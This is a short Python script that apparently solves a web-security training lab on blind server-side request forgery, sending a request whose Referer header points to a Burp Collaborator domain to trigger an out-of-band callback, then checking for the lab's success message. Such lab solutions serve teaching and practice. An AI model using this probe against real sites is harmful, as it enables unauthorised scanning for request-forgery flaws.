import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def oast(s, url, path):
    target_url = url + path
    headers = {
        'Referer': 'https://abc123xyz.burpcollaborator.net'
    }
    r = s.get(target_url, headers=headers)

    if r.status_code == 200:
        print(f'[+] Successful causing out-of-band technique')
    else:
        print(f'[-] Failed to causing out-of-band technique')
        sys.exit(-1)


def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    oast(s, url, '/product?productId=1')
    check_solved_lab(s, url)


if __name__ == '__main__':
    main()